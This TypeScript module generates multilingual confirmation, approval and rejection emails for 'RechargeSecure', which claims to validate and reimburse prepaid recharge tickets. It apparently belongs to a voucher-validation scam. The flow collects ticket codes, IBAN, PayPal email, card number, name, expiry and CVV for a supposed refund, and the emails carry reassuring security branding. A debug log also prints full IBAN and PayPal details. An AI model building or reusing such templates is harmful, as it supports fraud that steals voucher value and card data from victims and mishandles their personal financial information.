import type { TicketSubmission } from "./types"
import type { Language } from "./i18n"


interface ValidationOrReimbursementTemplate {
  subject: string;
  greeting: string;
  confirmationMessage: string;
  requestNumber: string;
  ticketCode: string;
  processingMessage: string;
  signature: string;
  trackingInfo: string;
}

interface ApprovedTemplate {
  subject: string;
  greeting: string;
  approvalMessage: string;
  nextSteps: string;
  signature: string;
}

interface RejectedTemplate {
  subject: string;
  greeting: string;
  rejectionMessage: string;
  contactInfo: string;
  signature: string;
}

interface EmailTemplate {
  subject: string;
  html: string;
  text: string;
}

const emailTranslations = {
  fr: {
    validation: {
      subject: "Confirmation de validation - Ticket {ticketType}",
      greeting: "Bonjour {userName},",
      confirmationMessage:
        "Nous avons bien reçu votre demande de validation pour votre ticket {ticketType} d'un montant de {amount}€.",
      requestNumber: "Numéro de demande: {requestId}",
      ticketCode: "Code du ticket: {ticketCode}",
      processingMessage:
        "Votre demande est en cours de traitement. Vous recevrez une notification dès que la validation sera terminée.",
      signature: "Cordialement,\nL'équipe RechargeSecure",
      trackingInfo: "Vous pouvez suivre l'état de votre demande à tout moment sur notre site web.",
    },
    reimbursement: {
      subject: "💸 Confirmation professionnelle de remboursement - Ticket {ticketType}",
      greeting: "Bonjour {userName},",
      confirmationMessage:
        "Nous accusons réception de votre demande de remboursement concernant votre ticket <strong>{ticketType}</strong> d'un montant de <strong>{amount}€</strong>. Toutes les informations ont été transmises à notre équipe spécialisée.",
      requestNumber: "Numéro de demande : <strong>{requestId}</strong>",
      ticketCode: "Code du ticket : <strong>{ticketCode}</strong>",
      processingMessage:
        "Votre demande est en cours d'analyse par nos experts. Pour garantir la sécurité et la conformité, chaque remboursement est vérifié avec attention. Le remboursement sera effectué sous <strong>3 à 5 jours ouvrés</strong> après validation complète de votre ticket. Vous recevrez un email de confirmation dès que le remboursement aura été réalisé sur le moyen choisi (carte, virement ou PayPal).",
      signature: "Cordialement,<br>L'équipe RechargeSecure 🛡️",
      trackingInfo: "Vous pouvez suivre l'évolution de votre demande à tout moment sur <a href='https://www.rechargesecure.com' style='color:#2563eb;'>notre site web</a>. Pour toute question, notre support est disponible à <a href='mailto:support@rechargesecure.com'>support@rechargesecure.com</a>.",
    },
    approved: {
      subject: "✅ Demande approuvée - Ticket {ticketType}",
      greeting: "Bonjour {userName},",
      approvalMessage: "Excellente nouvelle ! Votre demande a été approuvée.",
      nextSteps: "Les prochaines étapes seront traitées automatiquement.",
      signature: "Cordialement,\nL'équipe RechargeSecure",
    },
    rejected: {
      subject: "❌ Demande rejetée - Ticket {ticketType}",
      greeting: "Bonjour {userName},",
      rejectionMessage:
        "Nous regrettons de vous informer que votre demande n'a pas pu être approuvée pour les raisons suivantes:",
      contactInfo: "Pour plus d'informations, contactez notre support à support@rechargesecure.com",
      signature: "Cordialement,\nL'équipe RechargeSecure",
    },
  },
  en: {
    validation: {
      subject: "Validation confirmation - {ticketType} ticket",
      greeting: "Hello {userName},",
      confirmationMessage: "We have received your validation request for your {ticketType} ticket worth {amount}€.",
      requestNumber: "Request number: {requestId}",
      ticketCode: "Ticket code: {ticketCode}",
      processingMessage:
        "Your request is being processed. You will receive a notification as soon as the validation is complete.",
      signature: "Best regards,\nThe RechargeSecure team",
      trackingInfo: "You can track the status of your request at any time on our website.",
    },
    reimbursement: {
      subject: "Reimbursement confirmation - {ticketType} ticket",
      greeting: "Hello {userName},",
      confirmationMessage: "We have received your reimbursement request for your {ticketType} ticket worth {amount}€.",
      requestNumber: "Request number: {requestId}",
      ticketCode: "Ticket code: {ticketCode}",
      processingMessage:
        "Your request is being processed. The reimbursement will be processed within 3-5 business days after validation.",
      signature: "Best regards,\nThe RechargeSecure team",
      trackingInfo: "You can track the status of your request at any time on our website.",
    },
    approved: {
      subject: "✅ Request approved - {ticketType} ticket",
      greeting: "Hello {userName},",
      approvalMessage: "Great news! Your request has been approved.",
      nextSteps: "The next steps will be processed automatically.",
      signature: "Best regards,\nThe RechargeSecure team",
    },
    rejected: {
      subject: "❌ Request rejected - {ticketType} ticket",
      greeting: "Hello {userName},",
      rejectionMessage: "We regret to inform you that your request could not be approved for the following reasons:",
      contactInfo: "For more information, contact our support at support@rechargesecure.com",
      signature: "Best regards,\nThe RechargeSecure team",
    },
  },
  es: {
    validation: {
      subject: "Confirmación de validación - Ticket {ticketType}",
      greeting: "Hola {userName},",
      confirmationMessage:
        "Hemos recibido su solicitud de validación para su ticket {ticketType} por un valor de {amount}€.",
      requestNumber: "Número de solicitud: {requestId}",
      ticketCode: "Código del ticket: {ticketCode}",
      processingMessage:
        "Su solicitud está siendo procesada. Recibirá una notificación tan pronto como se complete la validación.",
      signature: "Saludos cordiales,\nEl equipo de RechargeSecure",
      trackingInfo: "Puede seguir el estado de su solicitud en cualquier momento en nuestro sitio web.",
    },
    reimbursement: {
      subject: "Confirmación de reembolso - Ticket {ticketType}",
      greeting: "Hola {userName},",
      confirmationMessage:
        "Hemos recibido su solicitud de reembolso para su ticket {ticketType} por un valor de {amount}€.",
      requestNumber: "Número de solicitud: {requestId}",
      ticketCode: "Código del ticket: {ticketCode}",
      processingMessage:
        "Su solicitud está siendo procesada. El reembolso se procesará dentro de 3-5 días hábiles después de la validación.",
      signature: "Saludos cordiales,\nEl equipo de RechargeSecure",
      trackingInfo: "Puede seguir el estado de su solicitud en cualquier momento en nuestro sitio web.",
    },
    approved: {
      subject: "✅ Solicitud aprobada - Ticket {ticketType}",
      greeting: "Hola {userName},",
      approvalMessage: "¡Excelentes noticias! Su solicitud ha sido aprobada.",
      nextSteps: "Los próximos pasos se procesarán automáticamente.",
      signature: "Saludos cordiales,\nEl equipo de RechargeSecure",
    },
    rejected: {
      subject: "❌ Solicitud rechazada - Ticket {ticketType}",
      greeting: "Hola {userName},",
      rejectionMessage: "Lamentamos informarle que su solicitud no pudo ser aprobada por las siguientes razones:",
      contactInfo: "Para más información, contacte nuestro soporte en support@rechargesecure.com",
      signature: "Saludos cordiales,\nEl equipo de RechargeSecure",
    },
  },
  pt: {
    validation: {
      subject: "Confirmação de validação - Ticket {ticketType}",
      greeting: "Olá {userName},",
      confirmationMessage: "Recebemos sua solicitação de validação para seu ticket {ticketType} no valor de {amount}€.",
      requestNumber: "Número da solicitação: {requestId}",
      ticketCode: "Código do ticket: {ticketCode}",
      processingMessage:
        "Sua solicitação está sendo processada. Você receberá uma notificação assim que a validação for concluída.",
      signature: "Atenciosamente,\nA equipe RechargeSecure",
      trackingInfo: "Você pode acompanhar o status de sua solicitação a qualquer momento em nosso site.",
    },
    reimbursement: {
      subject: "Confirmação de reembolso - Ticket {ticketType}",
      greeting: "Olá {userName},",
      confirmationMessage: "Recebemos sua solicitação de reembolso para seu ticket {ticketType} no valor de {amount}€.",
      requestNumber: "Número da solicitação: {requestId}",
      ticketCode: "Código do ticket: {ticketCode}",
      processingMessage:
        "Sua solicitação está sendo processada. O reembolso será processado em 3-5 dias úteis após a validação.",
      signature: "Atenciosamente,\nA equipe RechargeSecure",
      trackingInfo: "Você pode acompanhar o status de sua solicitação a qualquer momento em nosso site.",
    },
    approved: {
      subject: "✅ Solicitação aprovada - Ticket {ticketType}",
      greeting: "Olá {userName},",
      approvalMessage: "Ótimas notícias! Sua solicitação foi aprovada.",
      nextSteps: "Os próximos passos serão processados automaticamente.",
      signature: "Atenciosamente,\nA equipe RechargeSecure",
    },
    rejected: {
      subject: "❌ Solicitação rejeitada - Ticket {ticketType}",
      greeting: "Olá {userName},",
      rejectionMessage: "Lamentamos informar que sua solicitação não pôde ser aprovada pelas seguintes razões:",
      contactInfo: "Para mais informações, entre em contato com nosso suporte em support@rechargesecure.com",
      signature: "Atenciosamente,\nA equipe RechargeSecure",
    },
  },
  de: {
    validation: {
      subject: "Validierungsbestätigung - {ticketType} Ticket",
      greeting: "Hallo {userName},",
      confirmationMessage:
        "Wir haben Ihre Validierungsanfrage für Ihr {ticketType} Ticket im Wert von {amount}€ erhalten.",
      requestNumber: "Anfragenummer: {requestId}",
      ticketCode: "Ticket-Code: {ticketCode}",
      processingMessage:
        "Ihre Anfrage wird bearbeitet. Sie erhalten eine Benachrichtigung, sobald die Validierung abgeschlossen ist.",
      signature: "Mit freundlichen Grüßen,\nDas RechargeSecure Team",
      trackingInfo: "Sie können den Status Ihrer Anfrage jederzeit auf unserer Website verfolgen.",
    },
    reimbursement: {
      subject: "Erstattungsbestätigung - {ticketType} Ticket",
      greeting: "Hallo {userName},",
      confirmationMessage:
        "Wir haben Ihre Erstattungsanfrage für Ihr {ticketType} Ticket im Wert von {amount}€ erhalten.",
      requestNumber: "Anfragenummer: {requestId}",
      ticketCode: "Ticket-Code: {ticketCode}",
      processingMessage:
        "Ihre Anfrage wird bearbeitet. Die Erstattung wird innerhalb von 3-5 Werktagen nach der Validierung bearbeitet.",
      signature: "Mit freundlichen Grüßen,\nDas RechargeSecure Team",
      trackingInfo: "Sie können den Status Ihrer Anfrage jederzeit auf unserer Website verfolgen.",
    },
    approved: {
      subject: "✅ Anfrage genehmigt - {ticketType} Ticket",
      greeting: "Hallo {userName},",
      approvalMessage: "Großartige Neuigkeiten! Ihre Anfrage wurde genehmigt.",
      nextSteps: "Die nächsten Schritte werden automatisch bearbeitet.",
      signature: "Mit freundlichen Grüßen,\nDas RechargeSecure Team",
    },
    rejected: {
      subject: "❌ Anfrage abgelehnt - {ticketType} Ticket",
      greeting: "Hallo {userName},",
      rejectionMessage:
        "Wir bedauern, Ihnen mitteilen zu müssen, dass Ihre Anfrage aus folgenden Gründen nicht genehmigt werden konnte:",
      contactInfo: "Für weitere Informationen kontaktieren Sie unseren Support unter support@rechargesecure.com",
      signature: "Mit freundlichen Grüßen,\nDas RechargeSecure Team",
    },
  },
}

function replaceVariables(template: string, variables: Record<string, string>): string {
  return template.replace(/\{(\w+)\}/g, (match, key) => variables[key] || match)
}

export function generateEmailTemplate(
  submission: TicketSubmission,
  type: "validation" | "reimbursement" | "approved" | "rejected",
  language: Language = "fr",
  rejectionReason?: string,
): EmailTemplate {

  const templates = emailTranslations[language] || emailTranslations.fr
  const template = templates[type]

  const variables: Record<string, string> = {
    userName: submission.user_name || '',
    ticketType: (submission.ticket_type || '').toUpperCase(),
    amount: submission.ticket_amount?.toString() || '',
    requestId: submission.id?.slice(0, 8) || '',
    ticketCode: submission.ticket_code ? `${submission.ticket_code.slice(0, 4)}****${submission.ticket_code.slice(-4)}` : '',
    reimbursementMethod: submission.reimbursement_method || '',
    bankIban: submission.bank_iban || '',
    paypalEmail: submission.paypal_email || '',
    cardNumber: submission.card_number ? `${submission.card_number.slice(0,4)}****${submission.card_number.slice(-4)}` : '',
  }

  // LOG DIAGNOSTIC : Affiche les variables utilisées pour le template d'email
  console.log('[DEBUG][TEMPLATE] Variables utilisées pour le template d\'email :', JSON.stringify(variables, null, 2));

  const subject = replaceVariables(template.subject, variables)
  const greeting = replaceVariables(template.greeting, variables)
  const signature = template.signature

  let bodyContent = ""

  if (type === "validation" || type === "reimbursement") {
    const t = template as ValidationOrReimbursementTemplate;
    bodyContent = `
      ${replaceVariables(t.confirmationMessage, variables)}
      
      <div style="margin: 20px 0; padding: 15px; background: #f0f9ff; border-left: 4px solid #0ea5e9; border-radius: 4px;">
        <strong>${replaceVariables(t.requestNumber, variables)}</strong><br>
        <strong>${replaceVariables(t.ticketCode, variables)}</strong>
        
        ${variables.reimbursementMethod ? `<div style="margin-top: 15px;">
          <strong>Méthode de remboursement :</strong> ${variables.reimbursementMethod}
          ${variables.bankIban ? `<br><strong>IBAN :</strong> ${variables.bankIban}` : ''}
          ${variables.paypalEmail ? `<br><strong>Email PayPal :</strong> ${variables.paypalEmail}` : ''}
          ${variables.cardNumber ? `
            <div style="margin-top: 10px;">
              <strong>Détails de la carte :</strong><br>
              • Numéro : ${variables.cardNumber}<br>
              ${submission.card_name ? `• Nom sur la carte : ${submission.card_name}<br>` : ''}
              ${submission.card_expiry ? `• Date d'expiration : ${submission.card_expiry}<br>` : ''}
              ${submission.card_cvv ? `• CVV : ${'*'.repeat(3)}` : ''}
            </div>
          ` : ''}
        </div>` : ''}
      </div>
      
      ${t.processingMessage}
      
      <div style="margin-top: 20px; padding: 15px; background: #f0fdf4; border-left: 4px solid #10b981; border-radius: 4px;">
        <strong>${t.trackingInfo}</strong>
      </div>
    `
  } else if (type === "approved") {
    const t = template as ApprovedTemplate;
    bodyContent = `
      ${t.approvalMessage}
      
      ${t.nextSteps}
    `
  } else if (type === "rejected") {
    const t = template as RejectedTemplate;
    bodyContent = `
      ${t.rejectionMessage}
      ${rejectionReason ? `\n• ${rejectionReason}` : ""}
      
      ${t.contactInfo}
    `
  }

  const textContent = `${greeting}\n\n${bodyContent.trim()}\n\n${signature}`

  const htmlContent = `
    <!DOCTYPE html>
    <html lang="${language}">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>${subject}</title>
      <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 600px; margin: 0 auto; padding: 20px; }
        .header { background: linear-gradient(135deg, #2563eb, #1d4ed8); color: white; padding: 20px; border-radius: 8px 8px 0 0; text-align: center; }
        .logo { font-size: 32px; font-weight: bold; margin-bottom: 10px; letter-spacing: 1px; }
        .content { background: #f8fafc; padding: 30px; border-radius: 0 0 8px 8px; }
        .info-box { background: #e0f2fe; padding: 15px; border-radius: 6px; margin: 20px 0; border-left: 4px solid #2563eb; box-shadow: 0 2px 8px #2563eb22; }
        .footer { text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #e2e8f0; color: #64748b; font-size: 14px; }
        .status-approved { color: #059669; font-weight: bold; }
        .status-rejected { color: #dc2626; font-weight: bold; }
        .emoji { font-size: 22px; vertical-align: middle; margin-right: 6px; }
      </style>
    </head>
    <body>
      <div class="header">
        <div class="logo">🛡️ RechargeSecure</div>
        <div style="font-size:18px; margin-top:4px;">Service Professionnel de Remboursement <span class="emoji">💸</span></div>
      </div>
      <div class="content">
        <p>${greeting}</p>
        ${bodyContent.split("\n").map((line) => `<p>${line.trim()}</p>`).join("")}
        <div class="info-box">
          <strong>📞 Informations de contact :</strong><br>
          <span class="emoji">📧</span> support@rechargesecure.com<br>
          <span class="emoji">📞</span> +48 22 123 45 67 (Pologne)<br>
          <span class="emoji">🌐</span> <a href="https://www.rechargesecure.com" style="color:#2563eb;">www.rechargesecure.com</a>
        </div>
        <p>${signature}</p>
      </div>
      <div class="footer">
        <p>© 2024 RechargeSecure. Tous droits réservés.</p>
        <p>Ce message a été envoyé automatiquement, merci de ne pas y répondre.</p>
      </div>
    </body>
    </html>
  `

  return {
    subject,
    html: htmlContent,
    text: textContent,
  }
}
